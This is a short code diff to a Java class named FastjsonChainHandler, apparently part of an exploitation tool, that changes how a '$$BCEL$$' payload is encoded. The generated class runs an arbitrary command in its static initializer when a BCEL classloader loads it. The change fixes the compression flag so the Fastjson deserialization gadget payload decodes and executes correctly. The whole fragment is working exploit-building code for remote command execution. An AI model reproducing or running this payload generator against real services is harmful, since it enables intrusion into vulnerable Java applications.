@@ -73,9 +73,9 @@ public class FastjsonChainHandler implements ChainHandler {
         // Generate a class with exec in static initializer — BCEL classloader runs
         // Class.forName(name, true, bcelClassLoader) which triggers static init.
         byte[] classBytes = generateBcelExecClass(cmd);
-        // Use Apache BCEL's Utility.encode() for correct $$BCEL$$ format.
-        // Apache BCEL 6.x uses a custom encoding ($X notation), NOT standard base64 with substitutions.
-        String encoded = org.apache.bcel.classfile.Utility.encode(classBytes, false);
+        // Use Apache BCEL's Utility.encode(bytes, true) with compression=true.
+        // BCEL ClassLoader.createClass() calls Utility.decode(s, true) — must match.
+        String encoded = org.apache.bcel.classfile.Utility.encode(classBytes, true);
         return "$$BCEL$$" + encoded;
     }
 
